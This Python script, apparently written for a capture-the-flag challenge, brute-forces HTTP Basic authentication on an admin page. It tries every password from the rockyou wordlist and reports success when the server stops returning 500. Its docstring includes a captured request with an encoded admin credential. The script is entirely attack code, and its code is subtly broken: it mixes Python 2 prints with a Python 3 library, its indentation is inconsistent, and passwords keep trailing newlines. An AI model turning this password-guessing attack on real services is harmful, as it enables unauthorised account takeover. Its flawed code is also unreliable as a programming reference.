#! /usr/bin/env python

"""
POST /johnny/admin/ HTTP/1.1
Host: web.onlinectf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web.onlinectf.com/johnny/
DNT: 1
Authorization: Basic YWRtaW46YWNhc2E=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
"""
from http.client import HTTPConnection
from base64 import b64encode
from multiprocessing.dummy import Pool as ThreadPool



uname = "admin"
pool = ThreadPool(2)

def brute_force(username):
  
  with open("/usr/share/wordlists/rockyou.txt") as passfile:
    for passwd in passfile:

    	print "[*] Trying {0}".format(passwd)
    	userpass = bytes(username + ':' + passwd)
    	string_userpass = b64encode(userpass).decode('iso-8859-1')
    	#print "[+] Forged b64encode auth string: {0}".format(string_userpass)
    	auth_header = { 'Authorization' : 'Basic %s' % string_userpass}
    	conection1 = HTTPConnection("web.onlinectf.com", 80)
    	conection1.request('POST', '/johnny/admin', headers=auth_header)
    	response = conection1.getresponse()
    	#print response.status

    	if response.status != 500:
			print " [+] Password found: {0}".format(passwd)
			print " [+] Auth header: {0}".format(string_userpass)
			break

if __name__ == '__main__':
	brute_force(uname)